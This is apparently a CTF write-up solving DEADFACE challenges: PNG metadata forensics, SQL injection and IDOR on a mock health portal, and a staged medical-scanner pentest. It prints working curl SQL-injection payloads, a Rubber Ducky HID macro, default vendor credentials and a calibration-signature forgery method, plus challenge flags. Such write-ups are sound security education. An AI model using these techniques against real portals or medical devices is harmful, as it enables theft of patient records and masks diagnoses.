# DEADFACE CTF — Writeup

## Challenge 1: Headshot

**Category:** Forensics / Steganography
**Flag:** `deadface{b00m_h34Dsh0TTT}`

### Description

We intercepted a DEADFACE hacker's laptop and determined he had stolen a man named
Daniel's entire identity. Identify which DEADFACE member is responsible.

### Files Provided

```
/home/arwah/Downloads/headshot/
├── headshot001.png
├── headshot002.png
├── headshot003.png
└── headshot003.png_original
```

All four files are 512x512 PNG images.

### Solution

The presence of `headshot003.png_original` alongside `headshot003.png` is a strong
hint: the third image was modified after being saved. Image edits in CTFs very often
mean hidden data in metadata rather than pixel-level steganography.

Running `exiftool` over the directory immediately reveals the answer:

```bash
$ exiftool /home/arwah/Downloads/headshot/*.png
```

`headshot001.png` and `headshot002.png` are clean, but `headshot003.png` carries a
PNG `tEXt` Comment chunk:

```
Comment                         : deadface{b00m_h34Dsh0TTT}
```

No pixel analysis (stegsolve, zsteg, LSB) was needed — the flag lives entirely in
the file's metadata.

### Flag

```
deadface{b00m_h34Dsh0TTT}
```

### Takeaways

- An `_original` copy next to an edited file is a classic indicator of post-save
  tampering — check metadata first.
- PNG metadata chunks (`tEXt`/`zTXt`) survive normal image viewing and are a common
  quick hiding spot in forensics challenges.

---

## Challenge 2: Health Spark — Login (SQL Injection)

**Category:** Web — SQL Injection
**Flag:** `deadface{typical_and_classic}`

**Target:** `http://45.79.200.170:3000/` (Health Spark Employer Portal)

### Recon

The login page is a simple username/password form posting JSON to `/api/login`:

```json
{"username": "...", "password": "..."}
```

Reading the client-side JavaScript is the key step. The inline script contains a
very deliberate hint:

```js
if (!data.token) {
  // No session issued -- bad creds, or the SQLi disclosure (HTTP 200 with
  // no token). Show the server's message; the response body may contain
  // more than the UI chooses to display.
  showError(data.message || data.error || 'Login failed.');
}
```

Translation: there is SQL injection on the login, and the server leaks data in an
HTTP 200 response that the UI never displays.

### Exploitation

A baseline request confirms normal behavior:

```bash
$ curl -s -X POST http://45.79.200.170:3000/api/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"test","password":"test"}'
# HTTP 401 — {"error":"Invalid credentials", ...}
```

The classic tautology injection in the username field:

```bash
$ curl -s -X POST http://45.79.200.170:3000/api/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"'"'"' OR 1=1 -- ","password":"x"}'
```

Response — **HTTP 200** with the first user's full database row dumped into the
body:

```json
{
  "message": "Login failed. That's weird... check the network traffic!",
  "username": "john.smith",
  "name": "John Smith",
  "role": "user",
  "departmentid": 10685,
  "password": "Locked_In_And_Ready",
  "flag": "deadface{typical_and_classic}"
}
```

The server never sanitizes `username`, concatenates it into the query, and then
serializes the resulting row (including the flag column) into the JSON response.
The UI only shows the `message`, so the flag is invisible in a browser but plain
in the network traffic — exactly as the code comment promised.

Side yield: valid credentials for `john.smith` / `Locked_In_And_Ready`, which set
up the next challenge.

### Flag

```
deadface{typical_and_classic}
```

### Takeaways

- Always read the page's JavaScript — challenge authors (and sloppy vibe-coded
  apps) leave breadcrumbs in client code.
- "HTTP 200 with no token" is an authentication-response inconsistency worth
  fuzzing; the raw response body often carries more than the UI renders.

---

## Challenge 3: Health Spark — Member Records (IDOR / Broken Access Control)

**Category:** Web — IDOR, Privilege Escalation via SQLi
**Flag:** `deadface{hipaa_exposure_is_bad}`

**Target:** `http://45.79.200.170:3000/dashboard`

### Recon

Logging in as `john.smith` issues a JWT (HS256):

```json
{"sub":"john.smith","name":"John Smith","role":"user","departmentid":10685,...}
```

The dashboard fetches member PHI records:

```js
const body = { departmentid: parseInt(dept, 10), FirstNameFilter: '',
               LastNameFilter: '', take: null, skip: 0 };
fetch('/api/patients', { method: 'POST',
  headers: { ..., 'Authorization': 'Bearer ' + token },
  body: JSON.stringify(body) });
```

Two candidate weaknesses:

1. `departmentid` is taken from the **request body**, not from the JWT — textbook
   IDOR setup.
2. An "Admin Tools" panel with a server-side photo fetcher (`/api/admin/fetch-photo`,
   potential SSRF), but it rejects non-admin tokens, and JWT `alg:none` tampering
   and a quick wordlist of weak HS256 secrets both fail.

### Exploitation

**Step 1 — Find other departments.** Swapping `departmentid` to nearby values
(10684, 10686, ...) returns empty member lists, so the interesting data lives in a
department we don't know yet. Rather than scanning ID space, reuse the login SQLi
to dump the users table. A LIKE-based payload pulls the second row:

```bash
$ curl -s -X POST http://45.79.200.170:3000/api/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"'"'"' OR username LIKE '"'"'%a%'"'"' -- ","password":"x"}'
```

```json
{
  "username": "maria.holloway",
  "name": "Maria Holloway",
  "role": "user",
  "departmentid": 18432,
  "password": "eybrGv3YmNCxaDVSBsmZ"
}
```

Chained exclusion payloads (`' OR username != 'john.smith' AND username != 'maria.holloway' ... --`)
enumerate the rest: `devon.pearce` and `aisha.nakamura`, also in department 18432.

**Step 2 — Log in as maria and pull her department's records:**

```bash
$ TOKEN=$(curl -s -X POST http://45.79.200.170:3000/api/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"maria.holloway","password":"eybrGv3YmNCxaDVSBsmZ"}' \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")

$ curl -s -X POST http://45.79.200.170:3000/api/patients \
    -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"departmentid":18432,"take":null,"skip":0}'
```

Department 18432 returns 10 full PHI records (names, SSNs, DOBs, diagnoses). One
of them is planted:

```json
{
  "name": "Patient Zero",
  "memberId": "HS-8820343",
  "ssn": "000-00-0000",
  "email": "records.exposed@example.com",
  "dob": "1990-01-01",
  "diagnosis": "deadface{hipaa_exposure_is_bad}",
  "plan": "Spark Premier PPO"
}
```

### Root Cause

`/api/patients` authorizes the **token** but scopes the query by a `departmentid`
supplied in the **request body**. The server never verifies that the requested
department matches the JWT's `departmentid` claim, so any authenticated user can
read any department's records — a direct HIPAA-grade broken access control flaw.
(The injection in `/api/login` merely served as the recon tool to discover the
target department.)

### Flag

```
deadface{hipaa_exposure_is_bad}
```

### Takeaways

- Access control must be enforced server-side per object; trusting client-supplied
  scoping parameters (`departmentid` in the body) is a guaranteed IDOR.
- One injection point (login) is often the key to a second, separate vulnerability
  (IDOR): dump the users table to learn the ID space before scanning blindly.

---

# Emedra CerebraScan CS-9000 — Medical Device Penetration Test

**Target:** `http://emedra.dctf.io:8080/` (Emedra CerebraScan operator console,
device serial **EM-CS9K-04417**, firmware **NeuraOS 2.3.1**, site **stdymphna-rmc-01**)

DEADFACE claims to have stolen patient records from St. Dymphna's Medical Center.
The device is air-gapped, so the breach must have been physical — two impostors
posing as IT. We were given the device itself for a penetration test.

The frontend is a Vite SPA. After `curl`ing the main bundle
(`/assets/index-CbamKmo7.js`) and grepping it, the full API surface falls out:

```
/api/healthz      /api/device        /api/hotspot/<id>
/api/connect      /api/shell         /api/capture
/api/kiosk/login  /api/kiosk/auth    /api/kiosk/patients
/api/kiosk/scan   /api/kiosk/about   /api/kiosk/hid
/api/external-display
```

`/api/connect` takes a `{tool, port}` pair and returns a session token that gates
the tool's specific endpoint (`/api/shell`, `/api/kiosk/hid`, `/api/capture`).
Lazy-loaded assets (`kiosk-Cww_EHUm.js`, `hidMacro-CuHggWtU.js`,
`bleCapture-Dgbjk0zZ.js`, ...) document how each tool window talks to the API.

---

## Challenge 4: Kiosk Browser — Lingering Strings

**Category:** Web / Information Disclosure
**Flag:** `deadface{v13w_s0urc3_sav3s_l1v3s}`

### Solution

The kiosk login screen isn't a route — it's an API response. The SPA fetches it as
raw HTML from `/api/kiosk/login`, so requesting it directly with `curl` shows markup
the rendered UI never displays:

```bash
$ curl -s http://emedra.dctf.io:8080/api/kiosk/login
```

```html
<div class="sw-status">Active study: <b>G.M.</b> · MRN ****13 · device locked</div>
<!-- TODO(dev): REMOVE before go-live — temporary QA technician PIN: deadface{v13w_s0urc3_sav3s_l1v3s} -->
```

### Flag

```
deadface{v13w_s0urc3_sav3s_l1v3s}
```

### Takeaways

- "View source" on API-served fragments, not just pages — comments intended for
  developers routinely survive into production.
- The same response leaks an active patient (G.M., MRN \*\*\*\*13) on an
  unauthenticated endpoint.

---

## Challenge 5: ScanWorks Login — Default Credentials

**Category:** Web / Hardcoded Defaults
**Flag:** `deadface{d3fault_cr3ds_n3v3r_ch4ng3d}`

### Solution

The asset-label hotspot (`/api/hotspot/sticker`) links to the vendor's own
documentation: `/assets/cs9000-field-service-manual.pdf`. Section 2.3 of the
Field Service Manual ships the factory technician account and warns to change it
on first boot — the hospital never did:

> Username: `emedra-svc`  Password: `ChangeMe!2019`

Logging in at `/api/kiosk/auth` succeeds and returns the maintenance token:

```bash
$ curl -s -X POST http://emedra.dctf.io:8080/api/kiosk/auth \
    -H 'Content-Type: application/json' \
    -d '{"username":"emedra-svc","password":"ChangeMe!2019"}'
{"ok":true,"token":"ab66608d-...","tech":{"name":"Service Technician"},
 "maintenanceToken":"deadface{d3fault_cr3ds_n3v3r_ch4ng3d}"}
```

### Flag

```
deadface{d3fault_cr3ds_n3v3r_ch4ng3d}
```

### Takeaways

- Medical devices ship with documented factory accounts; an internet-accessible
  copy of the service manual makes the "secret" public.
- The manual is also a roadmap for the rest of the engagement: it documents the
  HDMI diagnostic OSD (level 3 = raw session dump), the USB-C service port, and
  unauthenticated BLE telemetry.

---

## Challenge 6: File System — Hardcoded Keys

**Category:** Physical Access / Live USB / Secrets in Config
**Flag:** `deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}`

### Solution

Connect the **Live Linux USB-A** tool (`/api/connect` with `tool: live-linux`,
`port: usb-a`) to get a shell token for `/api/shell`. The live environment's
`README.txt` states the scanner's internal storage is unencrypted:

```bash
$ lsblk                      # sda2 (31G, ext4, "scanworks-data")
$ sudo mount /dev/sda2 /mnt
$ ls /mnt/opt/scanworks      # calibration  config.yaml  logs  scanworks.bin
```

`config.yaml` contains a hardcoded upstream API key the vendor left in the
commissioning config:

```yaml
# Upstream API key (service account). TODO: move to secrets store before GA.
api_key: deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}

integrity:
  salt: EM-2019          # calibration signature salt

debug_console:
  enabled: true
  function: debug.dump
  tables: [patients, calibration, audit]
```

### Flag

```
deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}
```

### Takeaways

- A physical interface (USB) defeats "no network access" in minutes.
- The same file seeds the next two attacks: `integrity.salt: EM-2019` (calibration
  forgery) and the `debug_console` block (hidden maintenance console).

---

## Challenge 7: HID — The Kiosk That Never Locked the Keyboard

**Category:** Hardware / HID Injection
**Flag:** `deadface{un10ck3d_k10sk_qu4cks_b4ck}`

### Solution

The kiosk is "just a browser in a box" — connect the **Rubber Ducky** to USB-A
(`windowType: hid-macro`). The bundled asset (`hidMacro-CuHggWtU.js`) ships a
default payload that documents the hidden console's key-chord:

```
DELAY 500
CTRL-ALT F12
DELAY 300
STRING <function>(<table>)
ENTER
```

From the `debug_console` block in `config.yaml`: function `debug.dump`, tables
`patients, calibration, audit`. Fill in the STRING line and POST to `/api/kiosk/hid`:

```json
{"token":"<ducky-token>","macro":"DELAY 500\nCTRL-ALT F12\nDELAY 300\nSTRING debug.dump(patients)\nENTER"}
```

Response:

```
ScanWorks debug console (NeuraOS 2.3.1)
> debug.dump(patients)
[100413] Gideon Marsh  | study: Cranial perfusion, contrast
[100666] Lenora Crane  | study: Baseline screen
[100228] Osric Vane    | study: Post-op follow-up
debug-token: deadface{un10ck3d_k10sk_qu4cks_b4ck}
```

### Flag

```
deadface{un10ck3d_k10sk_qu4cks_b4ck}
```

### Takeaways

- Kiosk lockdown that ignores the physical keyboard is no lockdown: one key-chord
  opened a debug console with no additional authentication.
- Client-side assets are free documentation for attackers.

---

## Challenge 8: Calibration Integrity — Signature Forgery

**Category:** Cryptography / Patient-Safety Impact
**Flag:** `deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}`

### The Flaw

`calibration/verify.py` shows the "signature" is not a signature at all:

```python
got = hashlib.sha256(data + salt.encode()).hexdigest()
# FIXME: replace with HMAC using the per-device key.
```

The salt is `integrity.salt: EM-2019` — printed in plain text in `config.yaml`,
which we already read off the data partition. Anyone with the config can forge a
valid signature over arbitrary calibration bytes.

### Exploitation

1. **Baseline** (`scanctl scan`, genuine calibration) — the anomaly is detected:

   ```
   CALIBRATION OK (sig verified)  report_above=0.35
   Patient: Gideon Marsh (MRN 100413)  study: Cranial perfusion
   RESULT: ANOMALY DETECTED (score 0.72) — refer for radiologist review
   ```

2. **Tamper** — write `calib.json` with `anomaly_threshold` and `report_above`
   raised to `0.99` (written via `base64 -d` to survive the shell's quote
   handling), then compute the forged signature locally:

   ```python
   sig = hashlib.sha256(tampered_bytes + b"EM-2019").hexdigest()
   ```

   and write it to `calib.json.sig`.

3. **Verify + scan** — the device accepts the forgery:

   ```
   $ scanctl verify
   calibration integrity: OK (signature verified)

   $ scanctl scan
   CALIBRATION OK (sig verified)  report_above=0.99
   Patient: Gideon Marsh (MRN 100413)  study: Cranial perfusion
   RESULT: No abnormality detected   [UNSAFE: finding 0.72 >= safe 0.35 suppressed]
   ```

A patient with a genuine 0.72 anomaly would be reported perfectly healthy.

### Flag

```
deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}
```

### Takeaways

- A keyed digest without a secret (salt-in-config "signatures") provides zero
  tamper protection — it's obfuscation, not integrity.
- Threshold parameters belong inside the trust boundary. If calibration can
  silence alarms, the integrity check is a patient-safety control and must use a
  per-device HMAC key stored securely.

---

## Challenge 9: BLE Telemetry — Eavesdropping the Air

**Category:** Wireless / Passive Reconnaissance
**Flag:** `deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}`

### Solution

The Field Service Manual (§5) documents the CS-9000's BLE remote-maintenance
telemetry as unauthenticated and unencrypted:

| Handle | Characteristic   | Format                                            |
|--------|------------------|---------------------------------------------------|
| 0x2a   | Vitals telemetry | binary vitals frames (6-byte payload)             |
| 0x37   | Maintenance log  | Base64 text, chunked across seq-numbered notifies |

Attach the **BLE Sniffer** to USB-A and pull `/api/capture` (bearer token from
`/api/connect`): 96 packets — 72 boring vitals frames on `0x2a`, 24 log chunks
on `0x37`.

Reassembly = sort by `seq`, concatenate hex payloads, Base64-decode:

```
St.Dymphna CS-9000 maint log | site=stdymphna-rmc-01 | tech=emedra-svc
last_patient: Gideon Marsh (MRN 100413)
note: telemetry unencrypted per EM-2019 default; flag deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}
```

### Flag

```
deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}
```

### Takeaways

- Cleartext BLE telemetry leaks the technician account, site ID, and the current
  patient's name and MRN to anyone with a ~$15 receiver — no pairing, no
  encryption, no alerting.
- This is a plausible piece of the DEADFACE attack chain: physical proximity was
  all that was ever required.

---

## Attack-Chain Summary (eMedra CS-9000)

1. **Recon** — SPA bundles expose the full API; service manual is public.
2. **Entry** — default tech account (`emedra-svc` / `ChangeMe!2019`).
3. **Persistence/recon on-device** — unencrypted storage + hardcoded API key and
   signature salt readable off the data partition via a live USB.
4. **Lateral access** — HID injection opens an unauthenticated debug console
   (`CTRL-ALT F12` → `debug.dump(patients)`).
5. **Patient-safety impact** — trivially forged calibration "signature" suppresses
   real anomaly findings.
6. **Passive exfiltration** — unencrypted BLE leaks patient and maintenance data
   to anyone nearby.

DEADFACE never needed to defeat a single real security control — every "check"
they bypassed was either a default, a comment, or a hash without a secret.
